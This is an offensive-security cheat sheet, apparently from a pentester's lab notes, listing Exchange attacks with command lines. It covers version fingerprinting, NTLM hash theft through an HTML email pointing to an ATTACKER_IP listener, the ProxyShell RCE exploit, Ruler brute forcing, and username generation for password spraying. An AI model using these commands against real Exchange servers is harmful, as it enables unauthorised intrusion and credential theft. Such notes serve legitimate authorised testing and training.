# Exchange Server Attacks

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### Exchange Version Enumeration via ClickOnce Manifest [added: 2026-04]
- **Tags:** #ExchangeEnum #VersionDetection #curl #xmllint #ExchangeRecon #ProxyShell #ProxyLogon
- **Trigger:** Port 443 open with Exchange OWA/ECP detected during web enumeration
- **Prereq:** Network access to Exchange server on HTTPS
- **Yields:** Exact Exchange version and build number for CVE matching
- **Opsec:** Low
- **Context:** Determine Exchange version remotely by checking the eDiscovery export tool manifest. Useful to identify patchable CVEs (ProxyShell, ProxyLogon, etc.).
- **Payload/Method:** `curl https://<TARGET_IP>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version`

### NTLM Theft via Exchange (HTML Injection) [added: 2026-04]
- **Tags:** #NTLMTheft #ExchangePhishing #ntlm_theft #HTMLInjection #CredentialCapture #T1187
- **Trigger:** Exchange/OWA accessible and you can send emails to internal users
- **Prereq:** Ability to send HTML emails to target users; SMB/HTTP listener running
- **Yields:** NTLMv2 hashes of users who open the crafted email
- **Opsec:** Med
- **Context:** Send crafted HTML email containing an image tag pointing to attacker SMB/HTTP listener. When the user opens the email in Outlook/OWA, their NTLM hash leaks.
- **Payload/Method:** `python3 ntlm_theft.py -g htm -s <ATTACKER_IP> -f <TARGET_USER>`

### ProxyShell Exploit (CVE-2021-34473/34523/31207) [added: 2026-04]
- **Tags:** #ProxyShell #ExchangeRCE #CVE202134473 #SSRF #UnauthRCE #T1190
- **Trigger:** Exchange 2013/2016/2019 detected with outdated build version
- **Prereq:** Unpatched Exchange server accessible on HTTPS; valid target email address
- **Yields:** Remote code execution as SYSTEM on Exchange server
- **Opsec:** High
- **Context:** Unauthenticated RCE chain on unpatched Exchange 2013/2016/2019. Exploits SSRF + privilege escalation + arbitrary file write.
- **Payload/Method:** `python3 proxyshell.py -u <EXCHANGE_URL> -e <TARGET_EMAIL>`

### Exchange Credential Brute Force via Ruler [added: 2026-04]
- **Tags:** #Ruler #ExchangeBruteForce #Autodiscover #MAPI #PasswordAttack #T1110
- **Trigger:** Exchange Autodiscover or MAPI/HTTP endpoint discovered
- **Prereq:** Username and password wordlists; network access to Exchange
- **Yields:** Valid Exchange/domain credentials
- **Opsec:** High
- **Context:** Brute force Exchange/Outlook credentials via Autodiscover or MAPI/HTTP endpoints.
- **Payload/Method:** `./ruler-linux64 --domain <DOMAIN> --insecure brute --users users.txt --passwords password.txt --verbose`

### Username Generation for Exchange Spraying [added: 2026-04]
- **Tags:** #UsernameAnarchy #UserEnum #NameGeneration #PasswordSpraying #ReconPrep #T1589
- **Trigger:** Have a list of employee names (e.g., from LinkedIn, website) and need username format
- **Prereq:** List of employee full names
- **Yields:** Username wordlist in multiple formats (first.last, flast, etc.) for spraying
- **Opsec:** Low
- **Context:** Generate likely username formats (first.last, flast, etc.) from a name list for password spraying against Exchange/OWA.
- **Payload/Method:** `./username-anarchy --input-file ./names.txt`
